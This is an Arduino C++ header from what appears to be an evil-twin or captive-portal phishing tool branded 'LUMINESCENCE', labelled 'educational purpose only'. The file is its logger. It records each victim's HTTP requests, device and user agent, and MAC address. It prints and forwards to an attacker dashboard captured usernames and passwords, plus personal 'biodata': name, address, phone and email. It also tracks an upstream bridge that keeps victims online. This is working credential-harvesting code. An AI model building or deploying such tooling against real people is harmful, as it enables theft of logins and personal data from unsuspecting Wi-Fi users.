#ifndef LOGGER_H
#define LOGGER_H

#include <Arduino.h>
#include "ua_parser.h"
#include "event_buffer.h"

// ============================================
//  Serial Logger — Phase 4
//  Serial output + event buffer feed for dashboard
// ============================================

namespace Logger {

  // --- Stats tracking ---
  unsigned int totalRequests = 0;
  unsigned int totalGET = 0;
  unsigned int totalPOST = 0;
  unsigned int credsCaptured = 0;
  unsigned int biodataCaptured = 0;
  int liveClients = 0;

  // --- Uptime string ---
  String uptime() {
    unsigned long ms = millis();
    unsigned long secs = ms / 1000;
    unsigned long mins = secs / 60;
    unsigned long hrs  = mins / 60;
    char buf[12];
    snprintf(buf, sizeof(buf), "%02lu:%02lu:%02lu",
             hrs % 24, mins % 60, secs % 60);
    return String(buf);
  }

  void banner() {
    Serial.println();
    Serial.print("\033[95m");  // bright pink/magenta
    Serial.println("▗▖   ▗▖ ▗▖▗▖  ▗▖▗▄▄▄▖▗▖  ▗▖▗▄▄▄▖ ▗▄▄▖ ▗▄▄▖▗▄▄▄▖▗▖  ▗▖ ▗▄▄▖▗▄▄▄▖");
    Serial.println("▐▌   ▐▌ ▐▌▐▛▚▞▜▌  █  ▐▛▚▖▐▌▐▌   ▐▌   ▐▌   ▐▌   ▐▛▚▖▐▌▐▌   ▐▌   ");
    Serial.println("▐▌   ▐▌ ▐▌▐▌  ▐▌  █  ▐▌ ▝▜▌▐▛▀▀▘ ▝▀▚▖▐▌   ▐▛▀▀▘▐▌ ▝▜▌▐▌   ▐▛▀▀▘");
    Serial.println("▐▙▄▄▖▝▚▄▞▘▐▌  ▐▌▗▄█▄▖▐▌  ▐▌▐▙▄▄▖▗▄▄▞▘▝▚▄▄▖▐▙▄▄▖▐▌  ▐▌▝▚▄▄▖▐▙▄▄▖");
    Serial.print("\033[0m");   // reset color
    Serial.println();
    Serial.println("  Author: Bangkit (0xnhsec) | Secutiy Educational Purpose Only");
    Serial.println();
  }

  void info(const String& msg) {
    Serial.printf("[+] %s\n", msg.c_str());
  }

  void warn(const String& msg) {
    Serial.printf("[!] %s\n", msg.c_str());
  }

  void separator() {
    Serial.println("──────────────────────────────────────────────");
  }

  void doubleSeparator() {
    Serial.println("══════════════════════════════════════════════");
  }

  void stats() {
    Serial.printf("[i] Requests: %u (GET: %u | POST: %u) | Creds: %u | Bio: %u | Clients: %d\n",
                  totalRequests, totalGET, totalPOST,
                  credsCaptured, biodataCaptured, liveClients);
  }

  // Log HTTP request with parsed UA + push to dashboard buffer
  void httpRequest(const String& method, const String& path,
                   const String& clientIP, const String& userAgent) {
    totalRequests++;
    bool isGet  = (method == "GET");
    bool isPost = (method == "POST");
    if (isGet) totalGET++;
    else if (isPost) totalPOST++;

    doubleSeparator();
    Serial.printf("[%s] %s %s\n", uptime().c_str(), method.c_str(), path.c_str());
    Serial.printf("  Client:  %s\n", clientIP.c_str());

    ParsedUA parsed;
    parsed.summary = "";
    if (userAgent.length() > 0) {
      parsed = UAParser::parse(userAgent);
      Serial.printf("  Device:  %s\n", parsed.summary.c_str());
      Serial.printf("  UA:      %s\n", userAgent.c_str());
    }

    // Skip pushing dashboard API noise into the feed
    if (path.startsWith("/api/") || path == "/dashboard") return;

    String portalTag;
    bool isPortal = (path.indexOf("Portal Check") >= 0);

    String detail = "{\"method\":";
    detail += EventBuffer::jsonStr(method);
    detail += ",\"path\":";
    detail += EventBuffer::jsonStr(path);
    detail += ",\"device\":";
    detail += EventBuffer::jsonStr(parsed.summary);
    detail += ",\"ua\":";
    detail += EventBuffer::jsonStr(userAgent);
    detail += "}";

    EventType t = isPortal ? EVT_PORTAL_CHECK
                 : (isPost ? EVT_HTTP_POST : EVT_HTTP_GET);
    EventBuffer::push(t, clientIP, detail);
  }

  void header(const String& name, const String& value) {
    if (value.length() > 0) {
      Serial.printf("  %s: %s\n", name.c_str(), value.c_str());
    }
  }

  void postBody(const String& body) {
    Serial.printf("  Body:    %s\n", body.c_str());
  }

  void credentials(const String& username, const String& password,
                   const String& clientIP = "") {
    credsCaptured++;
    separator();
    warn("CREDENTIALS CAPTURED (#" + String(credsCaptured) + "):");
    Serial.printf("  Username: %s\n", username.c_str());
    Serial.printf("  Password: %s\n", password.c_str());
    separator();
    stats();

    String detail = "{\"username\":";
    detail += EventBuffer::jsonStr(username);
    detail += ",\"password\":";
    detail += EventBuffer::jsonStr(password);
    detail += "}";
    EventBuffer::push(EVT_CREDENTIAL, clientIP, detail);
  }

  void biodata(const String& nama, const String& alamat,
               const String& telepon, const String& email = "",
               const String& clientIP = "") {
    biodataCaptured++;
    separator();
    warn("BIODATA CAPTURED:");
    Serial.printf("  Nama:    %s\n", nama.c_str());
    Serial.printf("  Alamat:  %s\n", alamat.c_str());
    Serial.printf("  Telepon: %s\n", telepon.c_str());
    if (email.length() > 0 && email != "(empty)") {
      Serial.printf("  Email:   %s\n", email.c_str());
    }
    separator();
    stats();

    String detail = "{\"nama\":";
    detail += EventBuffer::jsonStr(nama);
    detail += ",\"alamat\":";
    detail += EventBuffer::jsonStr(alamat);
    detail += ",\"telepon\":";
    detail += EventBuffer::jsonStr(telepon);
    detail += ",\"email\":";
    detail += EventBuffer::jsonStr(email);
    detail += "}";
    EventBuffer::push(EVT_BIODATA, clientIP, detail);
  }

  void clientConnected(const String& mac) {
    liveClients++;
    String detail = "{\"mac\":";
    detail += EventBuffer::jsonStr(mac);
    detail += "}";
    EventBuffer::push(EVT_CLIENT_CONNECT, "", detail);
  }

  void clientDisconnected(const String& mac) {
    liveClients--;
    if (liveClients < 0) liveClients = 0;
    String detail = "{\"mac\":";
    detail += EventBuffer::jsonStr(mac);
    detail += "}";
    EventBuffer::push(EVT_CLIENT_DISCONNECT, "", detail);
  }

  void clientEvent(const String& event, const String& detail) {
    Serial.printf("[*] %s: %s\n", event.c_str(), detail.c_str());
  }

  void bridgeUp(const String& ssid, const String& ip) {
    doubleSeparator();
    Serial.printf("[+] BRIDGE UP — upstream: %s  STA IP: %s\n",
                  ssid.c_str(), ip.c_str());
    String detail = "{\"upstream\":";
    detail += EventBuffer::jsonStr(ssid);
    detail += ",\"ip\":";
    detail += EventBuffer::jsonStr(ip);
    detail += "}";
    EventBuffer::push(EVT_BRIDGE_UP, ip, detail);
  }

  void bridgeDown(const String& reason) {
    doubleSeparator();
    Serial.printf("[!] BRIDGE DOWN — %s\n", reason.c_str());
    String detail = "{\"reason\":";
    detail += EventBuffer::jsonStr(reason);
    detail += "}";
    EventBuffer::push(EVT_BRIDGE_DOWN, "", detail);
  }
}

#endif
